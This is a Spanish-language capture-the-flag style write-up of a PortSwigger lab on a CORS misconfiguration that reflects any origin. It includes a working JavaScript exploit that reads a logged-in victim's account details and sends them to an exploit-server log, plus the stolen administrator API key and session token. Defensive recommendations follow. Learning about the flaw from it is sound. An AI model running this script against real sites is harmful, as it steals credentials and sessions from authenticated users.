# Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

Iniciamos el laboratorio y nos encontramos con un sitio de compras online:
![image](https://github.com/user-attachments/assets/27097d64-5cfd-42ac-882e-a8d2e4704b4f)

Tenemos que acceder a algun endpoint que nos permita visualizar nuestra API key, por lo que procedemos a autenticarnos con nuestras credenciales `wiener:peter`:
![image](https://github.com/user-attachments/assets/6aac9bd4-4886-4833-a96d-762e03af1942)

Dashboard del usuario `wiener`:
![image](https://github.com/user-attachments/assets/08d91dd3-eace-4c2d-a73d-adb1b5e7426b)

Notamos que adem√°s tramita un endpoint interesante:
![image](https://github.com/user-attachments/assets/3d1cff9f-aaa0-4f4a-a5b2-a3e2c427323b)

El endpoint `/accountDetails` muestra una configuraci√≥n vulnerable a CORS con reflexi√≥n de origen, y la imagen demuestra claramente que la explotaci√≥n es posible. 
La solicitud GET a `/accountDetails` devuelve informaci√≥n sensible del usuario autenticado:
```json
{
  "username": "wiener",
  "email": "",
  "apikey": "KNOtNNLqwPrDs2yrDB1WSo909dr1VGaE",
  "sessions": [...]
}
```
Y el encabezado de respuesta:
```http
Access-Control-Allow-Credentials: true
```

Esto permite que el navegador env√≠e cookies en solicitudes cross-origin.

Esto es inseguro si el servidor tambi√©n refleja el origen (`Origin`) sin validaci√≥n.

Para validar esto, enviamos esta solicitud al `Repeater` y a√±adimos una nueva cabecera `Origin: https://attacker.com`, la respuesta incluir√°:
```http
Access-Control-Allow-Origin: https://attacker.com
```

Realizamos la prueba, esta nueva captura confirma que el sitio es vulnerable a una explotaci√≥n CORS con reflexi√≥n de origen:
![image](https://github.com/user-attachments/assets/5231fe33-2b1f-4d25-a0c2-ec335fa74439)

- El servidor est√° reflejando din√°micamente el origen proporcionado (https://attacker.com).

- Y permite el uso de cookies/autenticaci√≥n (Access-Control-Allow-Credentials: true).

Un atacante puede desde su propio dominio malicioso (attacker.com) hacer una solicitud autenticada con cookies del usuario v√≠ctima a `/accountDetails`, y robar la API key y otros datos privados.

Procedemos a utilizar un script:

```html
<html>
  <body>
    <script>
      var req = new XMLHttpRequest();
      req.onload = function() {
        location = '/log?data=' + this.responseText;
      };
      req.open('GET', 'https://0af80099040020e7ec49840800a3004f.web-security-academy.net/accountDetails', true);
      req.withCredentials = true;
      req.send();
    </script>
  </body>
</html>

```

Simulamos levantar nuestro servidor de atacante accediendo al bot√≥n `Go to exploit server`, ah√≠ pegamos nuestro script que simula el desarrollo de una p√°gina que produce el exploit. Primero hacemos click en `Store` y luego en `Send exploit to victim`.

Accedemos a los logs mediante el bot√≥n `Access log`:
![image](https://github.com/user-attachments/assets/d3f13ff5-7bf3-4a48-809b-4235e4025c5f)

Obtenemos la informaci√≥n del usuario administrator:
```http
%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22tRNkNQZiJtz3mCI80EDVyV2lQz6F4Fr5%22,%20%20%22sessions%22:%20[%20%20%20%20%22imTj0ZUcHiYgBJZHW1O7PrOQLZkA4Qyk%22%20%20]}
```

Puntualmente observamos la API key:
```bash
GET /log?data={"username":"administrator", ... "apikey":"tRNkNQZiJtz3mCI80EDVyV2lQz6F4Fr5"}
```

La solicitud proviene de una IP interna (10.0.4.32), que representa al navegador de la v√≠ctima autenticada (usuario administrator).

El contenido robado incluye:

- El username (administrator)

- La API key completa

- La cookie de sesi√≥n (sessions)

Procedemos a cargar la API key de la v√≠ctima y resolvemos el laboratorio:

![image](https://github.com/user-attachments/assets/b190c744-8ef2-43f9-bb72-7abbf24a6504)

---

## ‚úÖ Conclusiones

Este laboratorio demuestra c√≥mo una configuraci√≥n incorrecta de CORS puede permitir a un atacante externo acceder a informaci√≥n sensible de usuarios autenticados. En este caso, la combinaci√≥n de:

- Reflejo din√°mico del encabezado `Origin`
- Uso de `Access-Control-Allow-Credentials: true`

permiti√≥ que un sitio malicioso realizara solicitudes autenticadas en nombre de la v√≠ctima y obtuviera su API key.

---

## üõ°Ô∏è Recomendaciones

Para prevenir este tipo de ataques:

- **Evitar reflejar el `Origin` sin validaci√≥n**. Solo permitir or√≠genes expl√≠citamente confiables mediante una lista blanca.
- **Nunca utilizar `Access-Control-Allow-Origin: *` junto con `Access-Control-Allow-Credentials: true`**.
- Asegurar que los endpoints sensibles no est√©n disponibles v√≠a CORS si no es estrictamente necesario.
- Implementar pol√≠ticas de seguridad en el navegador como `SameSite=Lax` en cookies, `Content-Security-Policy`, y `Referrer-Policy`.

---

## üìö Lecciones aprendidas

- CORS no es una pol√≠tica de seguridad en s√≠ misma, sino una forma de **relajar la pol√≠tica del mismo origen**. Por eso, **su mal uso genera vulnerabilidades**.
- El hecho de que el navegador bloquee una solicitud no significa que el servidor est√© seguro: **el navegador protege al usuario, no al backend**.
- Es importante validar manualmente c√≥mo responde un servidor ante diferentes or√≠genes, especialmente en endpoints autenticados o sensibles.

